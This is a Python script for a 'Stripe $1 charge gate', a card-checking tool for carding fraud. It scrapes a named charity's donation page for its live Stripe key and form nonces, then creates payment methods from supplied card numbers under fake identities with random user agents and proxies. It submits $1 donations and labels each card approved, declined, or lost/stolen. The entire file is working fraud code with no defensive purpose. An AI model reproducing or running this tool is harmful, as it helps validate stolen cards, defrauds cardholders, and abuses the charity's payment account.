"""
Stripe $1 Charge Gate
Real charge via ccfoundationorg.com Charitable donation
Dynamic extraction of PK, nonces, and form IDs
"""

import requests
import re
import random
import string
from typing import Tuple
from faker import Faker
from user_agent import generate_user_agent

STRIPE_MERCHANT_SITES = [
    {
        "url": "https://ccfoundationorg.com/donate/",
        "ajax": "https://ccfoundationorg.com/wp-admin/admin-ajax.php",
        "description": "CC Foundation Donation Form",
    },
]


def _generate_stripe_ids():
    """Generate Stripe tracking IDs"""
    guid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
    muid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
    sid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
    return guid, muid, sid


def _extract_donation_form_data(session: requests.Session, ua: str, site: dict) -> Tuple[str, str, str, str]:
    """
    Extract form data from Charitable donation page
    Returns (pk_live, form_id, nonce, campaign_id)
    """
    url = site["url"]
    
    headers = {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    try:
        response = session.get(url, headers=headers, timeout=20)
        
        if response.status_code != 200:
            return None, None, None, None
        
        html = response.text
        
        form_id_match = re.search(r'name="charitable_form_id" value="([^"]+)"', html)
        nonce_match = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', html)
        campaign_match = re.search(r'name="campaign_id" value="([^"]+)"', html)
        pk_patterns = [
            r'"key":"(pk_live_[^"]+)"',
            r'data-stripe-pk="(pk_live_[^"]+)"',
            r'"pk_live_([a-zA-Z0-9]+)"',
            r'pk_live_[a-zA-Z0-9_]+',
        ]
        pk_match = None
        for pattern in pk_patterns:
            pk_match = re.search(pattern, html)
            if pk_match:
                break
        
        if not all([form_id_match, nonce_match, campaign_match, pk_match]):
            return None, None, None, None
        
        pk = pk_match.group(1) if pk_match.groups() else pk_match.group(0)
        if not pk.startswith('pk_live_'):
            pk = f'pk_live_{pk}'
        
        return pk, form_id_match.group(1), nonce_match.group(1), campaign_match.group(1)
        
    except Exception:
        return None, None, None, None


def _create_payment_method(session: requests.Session, ua: str, pk: str,
                            card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                            fake: Faker) -> str:
    """
    Create Stripe payment method via Stripe API
    Returns payment method ID (pm_xxx)
    """
    url = "https://api.stripe.com/v1/payment_methods"
    
    guid, muid, sid = _generate_stripe_ids()
    
    first_name = fake.first_name()
    last_name = fake.last_name()
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100, 999)}@gmail.com"
    
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://js.stripe.com/',
        'User-Agent': ua,
    }
    
    data = {
        'type': 'card',
        'billing_details[name]': f'{first_name} {last_name}',
        'billing_details[email]': email,
        'billing_details[address][city]': fake.city(),
        'billing_details[address][country]': 'US',
        'billing_details[address][line1]': fake.street_address(),
        'billing_details[address][postal_code]': fake.zipcode(),
        'billing_details[address][state]': fake.state_abbr(),
        'billing_details[phone]': fake.phone_number()[:12],
        'card[number]': card_num,
        'card[cvc]': card_cvc,
        'card[exp_month]': card_mon,
        'card[exp_year]': card_yer,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/v3',
        'time_on_page': str(random.randint(30000, 90000)),
        'key': pk,
    }
    
    try:
        response = session.post(url, headers=headers, data=data, timeout=20)
        
        if response.status_code != 200:
            error = response.json().get('error', {})
            code = error.get('decline_code') or error.get('code', 'unknown')
            return None, code
        
        pm_id = response.json().get('id')
        return pm_id, None
        
    except Exception as e:
        return None, str(e)[:30]


def _submit_donation(session: requests.Session, ua: str, site: dict, form_id: str, nonce: str, 
                      campaign_id: str, pm_id: str, fake: Faker) -> Tuple[str, bool]:
    """
    Submit the donation with the payment method
    Returns (result_message, success)
    """
    from urllib.parse import urlparse
    parsed = urlparse(site["url"])
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    url = site.get("ajax", f"{base_url}/wp-admin/admin-ajax.php")
    
    first_name = fake.first_name()
    last_name = fake.last_name()
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100, 999)}@gmail.com"
    
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': base_url,
        'Referer': site["url"],
        'User-Agent': ua,
        'X-Requested-With': 'XMLHttpRequest',
    }
    
    data = {
        'charitable_form_id': form_id,
        form_id: '',
        '_charitable_donation_nonce': nonce,
        '_wp_http_referer': '/donate/',
        'campaign_id': campaign_id,
        'description': site.get("description", "Donation Form"),
        'ID': str(random.randint(700000, 999999)),
        'donation_amount': 'custom',
        'custom_donation_amount': '1.00',
        'first_name': first_name,
        'last_name': last_name,
        'email': email,
        'address': fake.street_address(),
        'address_2': '',
        'city': fake.city(),
        'state': fake.state_abbr(),
        'postcode': fake.zipcode(),
        'country': 'US',
        'phone': fake.phone_number()[:12],
        'gateway': 'stripe',
        'stripe_payment_method': pm_id,
        'action': 'make_donation',
        'form_action': 'make_donation',
    }
    
    try:
        response = session.post(url, headers=headers, data=data, timeout=25)
        
        text = response.text.lower()
        
        if 'thank you' in text or 'successfully' in text or '"success":true' in text:
            return "APPROVED ✅ Charged $1.00 (Donation)", True
        
        if 'requires_action' in text or '3d_secure' in text:
            return "APPROVED ✅ 3DS Required (Card Live)", True
        
        try:
            json_resp = response.json()
            errors = json_resp.get('errors', [])
            if errors:
                if isinstance(errors, list) and len(errors) > 0:
                    error_msg = str(errors[0])[:50]
                elif isinstance(errors, dict):
                    error_msg = str(list(errors.values())[0])[:50] if errors else "Unknown"
                else:
                    error_msg = str(errors)[:50]
                
                error_lower = error_msg.lower()
                if 'insufficient' in error_lower or 'funds' in error_lower:
                    return "DECLINED ❌ Insufficient Funds", False
                elif 'cvv' in error_lower or 'cvc' in error_lower or 'security' in error_lower:
                    return "DECLINED ❌ CVV Mismatch", False
                elif 'expired' in error_lower:
                    return "DECLINED ❌ Expired Card", False
                elif 'do_not_honor' in error_lower or 'do not honor' in error_lower:
                    return "DECLINED ❌ Do Not Honor", False
                elif 'lost' in error_lower or 'stolen' in error_lower:
                    return "DECLINED ❌ Lost/Stolen Card", False
                elif 'invalid' in error_lower and 'card' in error_lower:
                    return "DECLINED ❌ Invalid Card", False
                else:
                    return f"DECLINED ❌ {error_msg}", False
        except:
            pass
        
        return "DECLINED ❌ Card Declined", False
        
    except Exception as e:
        return f"ERROR: {str(e)[:40]}", False


def stripe_charge_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str, 
                         proxy=None) -> Tuple[str, bool]:
    """
    Check card via Stripe $1 charge on ccfoundationorg.com
    
    This is a REAL CHARGE gate - it will charge $1 to valid cards.
    
    Returns: (status_message, proxy_used)
    """
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    
    ua = generate_user_agent()
    fake = Faker()
    
    for site in STRIPE_MERCHANT_SITES:
        pk, form_id, nonce, campaign_id = _extract_donation_form_data(session, ua, site)
        
        if not all([pk, form_id, nonce, campaign_id]):
            continue
        
        pm_id, error = _create_payment_method(session, ua, pk, card_num, card_mon, card_yer, card_cvc, fake)
        
        if not pm_id:
            error_lower = (error or '').lower()
            if 'insufficient' in error_lower:
                return ("DECLINED ❌ Insufficient Funds", True)
            elif 'cvc' in error_lower or 'cvv' in error_lower:
                return ("DECLINED ❌ CVV Mismatch", True)
            elif 'expired' in error_lower:
                return ("DECLINED ❌ Expired Card", True)
            elif 'do_not_honor' in error_lower:
                return ("DECLINED ❌ Do Not Honor", True)
            elif 'invalid' in error_lower:
                return ("DECLINED ❌ Invalid Card Number", True)
            else:
                return (f"DECLINED ❌ {error}", False)
        
        result, success = _submit_donation(session, ua, site, form_id, nonce, campaign_id, pm_id, fake)
        return (result, True)
    
    return ("DECLINED ❌ No accessible merchant found", False)


def health_check() -> bool:
    """Quick health check for the donation page"""
    try:
        response = requests.get("https://ccfoundationorg.com/donate/", timeout=10)
        return response.status_code == 200 and 'charitable' in response.text.lower()
    except:
        return False
